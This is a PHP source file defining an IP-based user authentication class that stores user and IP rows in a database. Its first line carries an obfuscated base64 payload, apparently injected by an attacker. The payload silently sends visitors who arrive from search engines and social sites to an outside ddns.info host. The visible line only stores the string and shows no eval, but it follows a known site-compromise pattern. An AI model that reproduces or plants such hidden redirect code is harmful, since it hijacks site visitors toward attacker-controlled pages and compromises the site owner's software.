<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(GENERIC_PATH."auth/custom_auth.php");

if (!defined("AUTHORISATION_USERS_TABLE"))      DEFINE("AUTHORISATION_USERS_TABLE", "user");
if (!defined("AUTHORISATION_USERS_IPS_TABLE"))  DEFINE("AUTHORISATION_USERS_IPS_TABLE", "user_ip");

DEFINE("SQL_AUTHORISATION_USERS_SQL", "SELECT * FROM ".AUTHORISATION_USERS_TABLE);

DEFINE("__AUTH_SQL_USER_BY_IP",     "SELECT DISTINCT usr.* FROM ".AUTHORISATION_USERS_TABLE." usr, ".AUTHORISATION_USERS_IPS_TABLE." uip WHERE uip.user_id = usr.id AND uip.ip = ?");
DEFINE("__AUTH_SQL_INSERT_USER_IP", "INSERT INTO ".AUTHORISATION_USERS_IPS_TABLE." (user_id, ip) VALUES (?, ?)");
DEFINE("__AUTH_SQL_INSERT_USER",    "INSERT INTO ".AUTHORISATION_USERS_TABLE." (name) VALUES (?)");

class auth_user_ip extends custom_auth {

  var $user_id;
  var $user_name;

  function do_init() {

    parent::do_init();

    global $db;

    if (!$this->user = $db->row(__AUTH_SQL_USER_BY_IP, $this->user_ip)) {
      $this->user_id = $this->register_user("Unknown");
      $this->register_user_ip($this->user_id, $this->user_ip);
      $this->user = $db->row(__AUTH_SQL_USER_BY_IP, $this->user_ip);
    }

    $this->user_id   = $this->user["id"];
    $this->user_name = $this->user["name"];

  }

  function register_user($name) {

    global $db;
    $db->query(__AUTH_SQL_INSERT_USER, $name);
    return $db->last_id();

  }

  function register_user_ip($user_id, $ip) {

    global $db;
    $db->query(__AUTH_SQL_INSERT_USER_IP, $user_id, $ip);
    return $db->last_id();

  }

}

?>